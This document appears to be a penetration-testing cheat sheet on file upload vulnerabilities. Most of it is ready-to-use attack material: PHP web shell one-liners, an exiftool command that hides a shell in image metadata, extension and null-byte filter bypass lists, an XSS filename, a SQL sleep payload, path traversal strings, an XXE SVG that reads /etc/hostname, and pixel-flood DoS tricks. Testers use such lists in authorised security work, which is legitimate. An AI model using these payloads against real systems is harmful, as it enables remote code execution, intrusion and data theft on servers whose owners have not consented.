### Vulnerabilities via Arbitrary File Upload


### Bypasses
#### MIME Type Bypass
```
Content-Type: image/jpeg
```

#### Content-Length Bypass
```
<?php system($_GET['c']);?>
```

#### Magic Number Validation Bypass
##### Use Exiftool and instert malicious code
```
exiftool -Comment='<?php echo "<pre>"; system($_GET['c']);?>' image.jpg
mv image.jpg image.php.jpg
```
#### Extension Bypass

| Type        | Extension       |
| ------------- |---------------|
| **php**      | phtml, .php, .php3, .php4, .php5, and .inc |
| **asp**      | asp, .aspx      |
| **perl** | .pl, .pm, .cgi, .lib      |
| **jsp**      | .jsp, .jspx, .jsw, .jsv, and .jspf      |
| **Coldfusion**      | .cfm, .cfml, .cfc, .dbm      |

#### Other Techniques(Extension Bypass)
```
file.shtml
file.asa
file.cert
```

##### Lower & Uppercase of Extensions
```
file.PhP
file.AspX
```

#### Using Special Trailing Such as Spaces, Dots or Null Characters or Double Extensions or Adding Junk Data
```
file.asp...
file.php;jpg
file.png.php
file.png.Php5
file.png.pHp5
file.php%00.png
file.php\x00.png
file.jpg%00.php
file.php%0d%0a
file.php/
file.php.\
file.php%20
file.php%0a
file.php%00
file.
file.php%0delete0.jpg
file.phpJunk123png
```

#### In IIS6 vulnerability, if the file name is ```file.asp;file.jpg```, the file will be executed as ```file.asp```.
#### In NginX, if the original file name is ```test.jpg```, testers/hackers may change it to ```test.jpg/x.php```, the file will be executed as ```x.php```.

### Chain With Other Vulnerabilities

#### XSS(Cross Site Scripting)
```
Filename: "><svg onload=alert(1)>.jpeg
xss.svg -> file contain xss payload inside svg format
```

#### SQL Injection
```
'sleep(10).jpg
```

#### Path Traversal
```
../../logo.png
../../etc/passwd/logo.png
```

#### RCE
```
ImageTragic
```

#### XXE
##### Filename: xxe.svg
##### Content-Type: image/svg+xml
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

#### SSRF
```
Change 'type=file' to 'type=url'
```
#### DoS Attack via Long File Name
```
# This one is a sample
aaaaaaaaa...zzzzzz.jpeg
```

#### DoS Attack via Pixel Flood Attack
![lottapixel.jpg](../Images/lottapixel.jpg)

#### Bypass
```
Replace the 64250*64250px pixel value with 0xfafa*0xfafa

For pixel change: https://www.resizepixel.com/
```
#### Meatadata Not Stripped From Image
```
- Upload image
- Copy the uploaded image url and paste it http://exif.regex.info/exif.cgi
- See any sensitive data like geolocation, IP address, device name etc. is exposed or not.
```

#### No Antivirus - EICAR file Upload
```
- Upload test malware file (EICAR).
- Observe that there is no AV installed on the web server that stops uploading EICAR file.
```
#### Uploaded file not found? Try Path Traversal on filename.
#### Try to brutefore file extension

### List of things that you can achieve by uploading file
* SVG: Stored XSS / SSRF / XXE
* HTML / JS : HTML injection / XSS / Open redirect
* ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
* GIF: Stored XSS / SSRF
* CSV: CSV injection
* PNG / JPEG: Pixel flood attack (DoS)
* ZIP: RCE via LFI / DoS
* PDF / PPTX: SSRF / BLIND XXE
* XML: XXE
* AVI: LFI / SSRF
